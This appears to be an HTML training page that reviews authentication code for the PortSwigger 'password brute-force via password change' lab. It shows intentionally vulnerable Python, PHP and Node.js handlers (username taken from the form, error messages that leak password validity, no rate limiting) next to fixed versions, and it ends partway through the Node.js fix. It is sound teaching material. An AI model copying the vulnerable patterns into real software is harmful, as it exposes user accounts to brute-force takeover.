<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Code Review Playground | Security Learning</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
    <style>
        :root {
            --bg-primary: #0a0e17;
            --bg-secondary: #131a2b;
            --bg-tertiary: #1a2540;
            --accent-red: #ff4757;
            --accent-green: #2ed573;
            --accent-blue: #3742fa;
            --accent-yellow: #ffa502;
            --accent-purple: #8b5cf6;
            --text-primary: #e2e8f0;
            --text-secondary: #94a3b8;
            --border-color: #2a3a5c;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Header */
        .header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 1.8rem;
            background: linear-gradient(135deg, var(--accent-red), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header-badge {
            display: flex;
            gap: 10px;
        }

        .badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-lab {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
            border: 1px solid var(--accent-red);
        }

        .badge-realworld {
            background: rgba(139, 92, 246, 0.2);
            color: var(--accent-purple);
            border: 1px solid var(--accent-purple);
        }

        /* Main Layout */
        .main-container {
            display: flex;
            height: calc(100vh - 80px);
        }

        /* Sidebar */
        .sidebar {
            width: 320px;
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            overflow-y: auto;
            padding: 20px 0;
        }

        .sidebar-section {
            margin-bottom: 25px;
        }

        .sidebar-title {
            padding: 10px 20px;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: var(--text-secondary);
            font-weight: 600;
        }

        .lab-item {
            padding: 12px 20px;
            cursor: pointer;
            border-left: 3px solid transparent;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .lab-item:hover {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-purple);
        }

        .lab-item.active {
            background: var(--bg-tertiary);
            border-left-color: var(--accent-red);
        }

        .lab-item i {
            font-size: 1.1rem;
            width: 24px;
            text-align: center;
        }

        .lab-item .lab-name {
            flex: 1;
            font-size: 0.9rem;
        }

        .lab-item .difficulty {
            font-size: 0.65rem;
            padding: 3px 8px;
            border-radius: 10px;
            text-transform: uppercase;
            font-weight: 600;
        }

        .difficulty.apprentice {
            background: rgba(46, 213, 115, 0.2);
            color: var(--accent-green);
        }

        .difficulty.practitioner {
            background: rgba(255, 165, 2, 0.2);
            color: var(--accent-yellow);
        }

        .difficulty.expert {
            background: rgba(255, 71, 87, 0.2);
            color: var(--accent-red);
        }

        /* Content Area */
        .content-area {
            flex: 1;
            overflow-y: auto;
            padding: 30px 40px;
        }

        /* Lab Header */
        .lab-header {
            margin-bottom: 30px;
        }

        .lab-header h2 {
            font-size: 1.6rem;
            margin-bottom: 10px;
            color: var(--text-primary);
        }

        .lab-meta {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }

        .meta-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .meta-item i {
            color: var(--accent-purple);
        }

        .lab-description {
            color: var(--text-secondary);
            line-height: 1.7;
            font-size: 0.95rem;
        }

        /* Vulnerability Explanation */
        .vuln-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .vuln-section h3 {
            font-size: 1.1rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .vuln-section h3 i {
            color: var(--accent-red);
        }

        .vuln-list {
            list-style: none;
            padding-left: 0;
        }

        .vuln-list li {
            padding: 8px 0;
            padding-left: 25px;
            position: relative;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        .vuln-list li::before {
            content: '▸';
            position: absolute;
            left: 0;
            color: var(--accent-red);
        }

        /* Code Review Section */
        .code-review-section {
            margin-bottom: 30px;
        }

        .code-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        .code-tab {
            padding: 10px 20px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .code-tab:hover {
            border-color: var(--accent-purple);
        }

        .code-tab.active {
            background: var(--accent-red);
            border-color: var(--accent-red);
            color: white;
        }

        .code-tab.secure.active {
            background: var(--accent-green);
            border-color: var(--accent-green);
        }

        .code-container {
            position: relative;
            background: #1e1e1e;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            background: var(--bg-tertiary);
            border-bottom: 1px solid var(--border-color);
        }

        .code-filename {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .code-filename i {
            color: var(--accent-yellow);
        }

        .code-actions {
            display: flex;
            gap: 10px;
        }

        .code-action-btn {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 6px 12px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s ease;
        }

        .code-action-btn:hover {
            background: var(--accent-purple);
            border-color: var(--accent-purple);
            color: white;
        }

        .code-block {
            padding: 20px;
            overflow-x: auto;
            max-height: 500px;
            overflow-y: auto;
        }

        .code-block pre {
            margin: 0;
            font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
        }

        .code-block code {
            font-family: inherit;
        }

        /* Vulnerability Markers */
        .vuln-line {
            background: rgba(255, 71, 87, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-red);
        }

        .secure-line {
            background: rgba(46, 213, 115, 0.15);
            display: block;
            margin: 0 -20px;
            padding: 0 20px;
            border-left: 3px solid var(--accent-green);
        }

        /* Analysis Panel */
        .analysis-panel {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .analysis-panel h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-yellow);
        }

        .analysis-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
        }

        .analysis-card {
            background: var(--bg-tertiary);
            border-radius: 10px;
            padding: 20px;
            border: 1px solid var(--border-color);
        }

        .analysis-card h4 {
            font-size: 0.9rem;
            color: var(--accent-purple);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .analysis-card p, .analysis-card ul {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.7;
        }

        .analysis-card ul {
            padding-left: 20px;
        }

        .analysis-card li {
            margin-bottom: 6px;
        }

        /* Attack Flow */
        .attack-flow {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .attack-flow h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-red);
        }

        .flow-steps {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .flow-step {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            padding: 15px;
            background: var(--bg-tertiary);
            border-radius: 10px;
            border-left: 3px solid var(--accent-purple);
        }

        .step-number {
            width: 32px;
            height: 32px;
            background: var(--accent-purple);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 0.9rem;
            flex-shrink: 0;
        }

        .step-content h4 {
            font-size: 0.95rem;
            margin-bottom: 6px;
            color: var(--text-primary);
        }

        .step-content p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        .step-content code {
            background: var(--bg-primary);
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.8rem;
            color: var(--accent-yellow);
        }

        /* Payload Section */
        .payload-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--border-color);
        }

        .payload-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-green);
        }

        .payload-box {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 15px;
            border: 1px solid var(--border-color);
            font-family: 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--accent-yellow);
            overflow-x: auto;
            position: relative;
        }

        .payload-box .payload-label {
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--bg-secondary);
            padding: 2px 10px;
            font-size: 0.7rem;
            color: var(--text-secondary);
            border-radius: 4px;
            font-family: 'Segoe UI', sans-serif;
        }

        /* Real World Section */
        .realworld-section {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.1), rgba(255, 71, 87, 0.1));
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid var(--accent-purple);
        }

        .realworld-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-purple);
        }

        .realworld-case {
            background: var(--bg-tertiary);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
        }

        .realworld-case:last-child {
            margin-bottom: 0;
        }

        .realworld-case h4 {
            font-size: 0.95rem;
            color: var(--text-primary);
            margin-bottom: 10px;
        }

        .realworld-case p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.7;
        }

        .realworld-case .bounty {
            display: inline-block;
            margin-top: 10px;
            padding: 4px 12px;
            background: rgba(46, 213, 115, 0.2);
            color: var(--accent-green);
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
        }

        /* Remediation Section */
        .remediation-section {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid var(--border-color);
        }

        .remediation-section h3 {
            font-size: 1.1rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--accent-green);
        }

        .remediation-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .remediation-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 15px;
            background: var(--bg-tertiary);
            border-radius: 8px;
        }

        .remediation-item i {
            color: var(--accent-green);
            margin-top: 3px;
        }

        .remediation-item p {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.6;
        }

        /* Hidden content */
        .hidden {
            display: none !important;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-purple);
        }

        /* Coming Soon Badge */
        .coming-soon {
            opacity: 0.5;
            pointer-events: none;
            position: relative;
        }

        .coming-soon::after {
            content: 'COMING SOON';
            position: absolute;
            right: 20px;
            font-size: 0.6rem;
            background: var(--bg-tertiary);
            padding: 2px 8px;
            border-radius: 4px;
            color: var(--text-secondary);
        }

        /* Interactive Hints */
        .hint-toggle {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s ease;
        }

        .hint-toggle:hover {
            border-color: var(--accent-yellow);
            color: var(--accent-yellow);
        }

        .hint-content {
            background: rgba(255, 165, 2, 0.1);
            border: 1px solid var(--accent-yellow);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .hint-content p {
            font-size: 0.9rem;
            color: var(--text-secondary);
            line-height: 1.7;
        }

        /* Language tabs for code */
        .language-tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .lang-tab {
            padding: 8px 16px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.8rem;
            color: var(--text-secondary);
            transition: all 0.3s ease;
        }

        .lang-tab:hover {
            border-color: var(--accent-blue);
        }

        .lang-tab.active {
            background: var(--accent-blue);
            border-color: var(--accent-blue);
            color: white;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1><i class="fas fa-shield-alt"></i> Authentication Code Review Playground</h1>
        <div class="header-badge">
            <span class="badge badge-lab">PortSwigger Labs</span>
            <span class="badge badge-realworld">Real-World CVEs</span>
        </div>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-title">Password Change Abuse</div>
                <div class="lab-item active" data-lab="password-change-bruteforce">
                    <i class="fas fa-key"></i>
                    <span class="lab-name">Password Brute-force via Password Change</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Username Enumeration</div>
                <div class="lab-item coming-soon" data-lab="username-enum-different">
                    <i class="fas fa-user-secret"></i>
                    <span class="lab-name">Via Different Responses</span>
                    <span class="difficulty apprentice">Apprentice</span>
                </div>
                <div class="lab-item coming-soon" data-lab="username-enum-subtle">
                    <i class="fas fa-user-secret"></i>
                    <span class="lab-name">Via Subtle Differences</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="username-enum-timing">
                    <i class="fas fa-clock"></i>
                    <span class="lab-name">Via Response Timing</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="username-enum-lock">
                    <i class="fas fa-lock"></i>
                    <span class="lab-name">Via Account Lock</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Brute-Force Protection</div>
                <div class="lab-item coming-soon" data-lab="bruteforce-ip-block">
                    <i class="fas fa-ban"></i>
                    <span class="lab-name">IP Block Bypass</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="bruteforce-multiple-creds">
                    <i class="fas fa-list"></i>
                    <span class="lab-name">Multiple Credentials</span>
                    <span class="difficulty expert">Expert</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">2FA Bypass</div>
                <div class="lab-item coming-soon" data-lab="2fa-simple">
                    <i class="fas fa-mobile-alt"></i>
                    <span class="lab-name">Simple 2FA Bypass</span>
                    <span class="difficulty apprentice">Apprentice</span>
                </div>
                <div class="lab-item coming-soon" data-lab="2fa-broken-logic">
                    <i class="fas fa-bug"></i>
                    <span class="lab-name">Broken 2FA Logic</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="2fa-bruteforce">
                    <i class="fas fa-hammer"></i>
                    <span class="lab-name">2FA Brute-Force</span>
                    <span class="difficulty expert">Expert</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Session & Cookies</div>
                <div class="lab-item coming-soon" data-lab="stay-logged-in">
                    <i class="fas fa-cookie"></i>
                    <span class="lab-name">Stay-Logged-In Cookie</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="offline-cracking">
                    <i class="fas fa-database"></i>
                    <span class="lab-name">Offline Password Cracking</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Password Reset</div>
                <div class="lab-item coming-soon" data-lab="reset-broken-logic">
                    <i class="fas fa-undo"></i>
                    <span class="lab-name">Broken Reset Logic</span>
                    <span class="difficulty apprentice">Apprentice</span>
                </div>
                <div class="lab-item coming-soon" data-lab="reset-poisoning">
                    <i class="fas fa-skull-crossbones"></i>
                    <span class="lab-name">Reset Poisoning</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="sidebar-title">Real-World Vulns</div>
                <div class="lab-item coming-soon" data-lab="jwt-none-alg">
                    <i class="fas fa-id-badge"></i>
                    <span class="lab-name">JWT None Algorithm</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
                <div class="lab-item coming-soon" data-lab="oauth-misconfig">
                    <i class="fab fa-google"></i>
                    <span class="lab-name">OAuth Misconfiguration</span>
                    <span class="difficulty practitioner">Practitioner</span>
                </div>
            </div>
        </div>

        <div class="content-area">
            <!-- Lab 14: Password Brute-force via Password Change -->
            <div id="password-change-bruteforce" class="lab-content">
                <div class="lab-header">
                    <h2><i class="fas fa-key"></i> Lab 14: Password Brute-force via Password Change</h2>
                    <div class="lab-meta">
                        <div class="meta-item">
                            <i class="fas fa-layer-group"></i>
                            <span>PortSwigger Web Security Academy</span>
                        </div>
                        <div class="meta-item">
                            <i class="fas fa-signal"></i>
                            <span>Difficulty: Practitioner</span>
                        </div>
                        <div class="meta-item">
                            <i class="fas fa-tag"></i>
                            <span>Authentication Bypass</span>
                        </div>
                    </div>
                    <p class="lab-description">
                        This lab's password change functionality contains a logic flaw that allows attackers to brute-force another user's password.
                        The vulnerability exists because the application's response differs based on whether the current password is correct,
                        enabling an attacker to enumerate valid passwords for any account.
                    </p>
                </div>

                <!-- Vulnerability Explanation -->
                <div class="vuln-section">
                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
                    <ul class="vuln-list">
                        <li>The password change form accepts a username parameter that can be manipulated</li>
                        <li>The application returns different error messages depending on whether the current password is correct</li>
                        <li>When current password is <strong>correct</strong> but new passwords don't match: <code>"New passwords do not match"</code></li>
                        <li>When current password is <strong>incorrect</strong>: <code>"Current password is incorrect"</code></li>
                        <li>This behavioral difference allows attackers to determine if a guessed password is valid</li>
                        <li>No rate limiting or account lockout on the password change endpoint</li>
                    </ul>
                </div>

                <!-- Code Review Section -->
                <div class="code-review-section">
                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code Review</h3>

                    <div class="language-tabs">
                        <button class="lang-tab active" data-lang="python">Python (Flask)</button>
                        <button class="lang-tab" data-lang="php">PHP</button>
                        <button class="lang-tab" data-lang="nodejs">Node.js</button>
                        <button class="lang-tab" data-lang="java">Java</button>
                    </div>

                    <div class="code-tabs">
                        <button class="code-tab active" data-view="vulnerable">
                            <i class="fas fa-exclamation-triangle"></i> Vulnerable Code
                        </button>
                        <button class="code-tab secure" data-view="secure">
                            <i class="fas fa-shield-alt"></i> Secure Code
                        </button>
                    </div>

                    <!-- Python Vulnerable Code -->
                    <div class="code-container" id="code-python-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-python"></i>
                                <span>auth_controller.py</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('python-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python" id="python-vuln">@app.route('/change-password', methods=['POST'])
def change_password():
    # VULNERABILITY 1: Username taken from user input instead of session
<span class="vuln-line">    username = request.form.get('username')  # ❌ User-controlled!</span>
    current_password = request.form.get('current_password')
    new_password1 = request.form.get('new_password1')
    new_password2 = request.form.get('new_password2')

    # Fetch user from database
    user = User.query.filter_by(username=username).first()

    if not user:
        return render_template('change_password.html', error='User not found')

    # VULNERABILITY 2: Different error messages reveal password validity
<span class="vuln-line">    if not check_password_hash(user.password, current_password):</span>
<span class="vuln-line">        return render_template('change_password.html', </span>
<span class="vuln-line">                               error='Current password is incorrect')  # ❌ Reveals invalid password</span>

    # VULNERABILITY 3: This message confirms the password was CORRECT
<span class="vuln-line">    if new_password1 != new_password2:</span>
<span class="vuln-line">        return render_template('change_password.html',</span>
<span class="vuln-line">                               error='New passwords do not match')  # ❌ Confirms valid password!</span>

    # VULNERABILITY 4: No rate limiting on this endpoint
    user.password = generate_password_hash(new_password1)
    db.session.commit()

    return render_template('change_password.html',
                           success='Password changed successfully')</code></pre>
                        </div>
                    </div>

                    <!-- Python Secure Code -->
                    <div class="code-container hidden" id="code-python-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-python"></i>
                                <span>auth_controller.py (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('python-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-python" id="python-secure">from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/change-password', methods=['POST'])
@login_required
<span class="secure-line">@limiter.limit("5 per minute")  # ✅ Rate limiting</span>
def change_password():
    # ✅ FIX 1: Get username from authenticated session only
<span class="secure-line">    username = current_user.username  # ✅ From session, not user input</span>
    current_password = request.form.get('current_password')
    new_password1 = request.form.get('new_password1')
    new_password2 = request.form.get('new_password2')

    user = User.query.filter_by(username=username).first()

    # ✅ FIX 2: Validate all inputs first, then check password
    # Perform all validations before revealing any information
<span class="secure-line">    if not new_password1 or not new_password2:</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='All fields are required')</span>

<span class="secure-line">    if new_password1 != new_password2:</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='New passwords do not match')</span>

<span class="secure-line">    if not validate_password_strength(new_password1):</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='Password does not meet requirements')</span>

    # ✅ FIX 3: Generic error message for authentication failures
<span class="secure-line">    if not check_password_hash(user.password, current_password):</span>
<span class="secure-line">        log_failed_attempt(username, request.remote_addr)  # ✅ Log for monitoring</span>
<span class="secure-line">        return render_template('change_password.html',</span>
<span class="secure-line">                               error='Password change failed')  # ✅ Generic message</span>

    # ✅ FIX 4: Invalidate other sessions after password change
    user.password = generate_password_hash(new_password1)
<span class="secure-line">    user.session_token = generate_new_session_token()  # ✅ Invalidate old sessions</span>
    db.session.commit()

    return render_template('change_password.html',
                           success='Password changed successfully')</code></pre>
                        </div>
                    </div>

                    <!-- PHP Vulnerable Code -->
                    <div class="code-container hidden" id="code-php-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-php"></i>
                                <span>change_password.php</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('php-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php" id="php-vuln">&lt;?php
// change_password.php - VULNERABLE VERSION

session_start();
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABILITY 1: Username from POST data, not session
<span class="vuln-line">    $username = $_POST['username'];  // ❌ User-controlled input!</span>
    $current_password = $_POST['current_password'];
    $new_password1 = $_POST['new_password1'];
    $new_password2 = $_POST['new_password2'];

    // Fetch user from database
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    $user = $stmt->fetch();

    if (!$user) {
        $error = "User not found";
    } else {
        // VULNERABILITY 2: Different responses leak password validity
<span class="vuln-line">        if (!password_verify($current_password, $user['password'])) {</span>
<span class="vuln-line">            $error = "Current password is incorrect";  // ❌ Reveals wrong password</span>
<span class="vuln-line">        } elseif ($new_password1 !== $new_password2) {</span>
<span class="vuln-line">            $error = "New passwords do not match";  // ❌ Confirms CORRECT password!</span>
        } else {
            // VULNERABILITY 3: No rate limiting, no lockout
            $hashed = password_hash($new_password1, PASSWORD_DEFAULT);
            $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE username = ?");
            $stmt->execute([$hashed, $username]);
            $success = "Password changed successfully";
        }
    }
}
?&gt;

&lt;!-- VULNERABILITY 4: Username in hidden field allows manipulation --&gt;
&lt;form method="POST"&gt;
<span class="vuln-line">    &lt;input type="hidden" name="username" value="&lt;?= htmlspecialchars($username) ?&gt;"&gt;</span>
    &lt;input type="password" name="current_password" placeholder="Current Password"&gt;
    &lt;input type="password" name="new_password1" placeholder="New Password"&gt;
    &lt;input type="password" name="new_password2" placeholder="Confirm Password"&gt;
    &lt;button type="submit"&gt;Change Password&lt;/button&gt;
&lt;/form&gt;</code></pre>
                        </div>
                    </div>

                    <!-- PHP Secure Code -->
                    <div class="code-container hidden" id="code-php-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-php"></i>
                                <span>change_password.php (Secure)</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('php-secure')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-php" id="php-secure">&lt;?php
// change_password.php - SECURE VERSION

session_start();
require_once 'db.php';
require_once 'rate_limiter.php';

// ✅ FIX 1: Require authentication
<span class="secure-line">if (!isset($_SESSION['user_id'])) {</span>
<span class="secure-line">    header('Location: /login');</span>
<span class="secure-line">    exit;</span>
<span class="secure-line">}</span>

// ✅ FIX 2: Rate limiting
<span class="secure-line">$rateLimiter = new RateLimiter($_SESSION['user_id'], 'password_change', 5, 300);</span>
<span class="secure-line">if (!$rateLimiter->allowRequest()) {</span>
<span class="secure-line">    $error = "Too many attempts. Please try again later.";</span>
<span class="secure-line">}</span>

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($error)) {
    // ✅ FIX 3: Get username from SESSION only
<span class="secure-line">    $username = $_SESSION['username'];  // ✅ From session, not user input</span>
    $current_password = $_POST['current_password'];
    $new_password1 = $_POST['new_password1'];
    $new_password2 = $_POST['new_password2'];

    // ✅ FIX 4: Validate new passwords BEFORE checking current password
<span class="secure-line">    if ($new_password1 !== $new_password2) {</span>
<span class="secure-line">        $error = "New passwords do not match";</span>
<span class="secure-line">    } elseif (strlen($new_password1) < 12) {</span>
<span class="secure-line">        $error = "Password must be at least 12 characters";</span>
    } else {
        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
        $stmt->execute([$username]);
        $user = $stmt->fetch();

        // ✅ FIX 5: Generic error message
<span class="secure-line">        if (!$user || !password_verify($current_password, $user['password'])) {</span>
<span class="secure-line">            log_security_event('password_change_failed', $username, $_SERVER['REMOTE_ADDR']);</span>
<span class="secure-line">            $error = "Password change failed. Please verify your current password.";</span>
        } else {
            $hashed = password_hash($new_password1, PASSWORD_DEFAULT);
            $new_session = bin2hex(random_bytes(32));

            // ✅ FIX 6: Invalidate all other sessions
<span class="secure-line">            $stmt = $pdo->prepare("UPDATE users SET password = ?, session_token = ? WHERE username = ?");</span>
<span class="secure-line">            $stmt->execute([$hashed, $new_session, $username]);</span>

            $_SESSION['session_token'] = $new_session;
            $success = "Password changed successfully";
        }
    }
}
?&gt;</code></pre>
                        </div>
                    </div>

                    <!-- Node.js Vulnerable Code -->
                    <div class="code-container hidden" id="code-nodejs-vulnerable">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-node-js"></i>
                                <span>authController.js</span>
                            </div>
                            <div class="code-actions">
                                <button class="code-action-btn" onclick="copyCode('nodejs-vuln')">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                            </div>
                        </div>
                        <div class="code-block">
                            <pre><code class="language-javascript" id="nodejs-vuln">// authController.js - VULNERABLE VERSION
const bcrypt = require('bcrypt');
const User = require('../models/User');

exports.changePassword = async (req, res) => {
    // VULNERABILITY 1: Username from request body, not session
<span class="vuln-line">    const { username, currentPassword, newPassword1, newPassword2 } = req.body;</span>

    try {
        const user = await User.findOne({ username });

        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }

        // VULNERABILITY 2: Check password first, revealing validity
<span class="vuln-line">        const isValid = await bcrypt.compare(currentPassword, user.password);</span>

<span class="vuln-line">        if (!isValid) {</span>
<span class="vuln-line">            // ❌ This error reveals the password is INCORRECT</span>
<span class="vuln-line">            return res.status(401).json({ error: 'Current password is incorrect' });</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 3: Different error = password was correct!
<span class="vuln-line">        if (newPassword1 !== newPassword2) {</span>
<span class="vuln-line">            // ❌ Attacker now knows the password is CORRECT</span>
<span class="vuln-line">            return res.status(400).json({ error: 'New passwords do not match' });</span>
<span class="vuln-line">        }</span>

        // VULNERABILITY 4: No rate limiting implemented
        const hashedPassword = await bcrypt.hash(newPassword1, 10);
        user.password = hashedPassword;
        await user.save();

        res.json({ message: 'Password changed successfully' });

    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
};</code></pre>
                        </div>
                    </div>

                    <!-- Node.js Secure Code -->
                    <div class="code-container hidden" id="code-nodejs-secure">
                        <div class="code-header">
                            <div class="code-filename">
                                <i class="fab fa-node-js"></i>
                                <span>authController.js (Secure)</span>
                            </div>
                            <div class="code-actions">
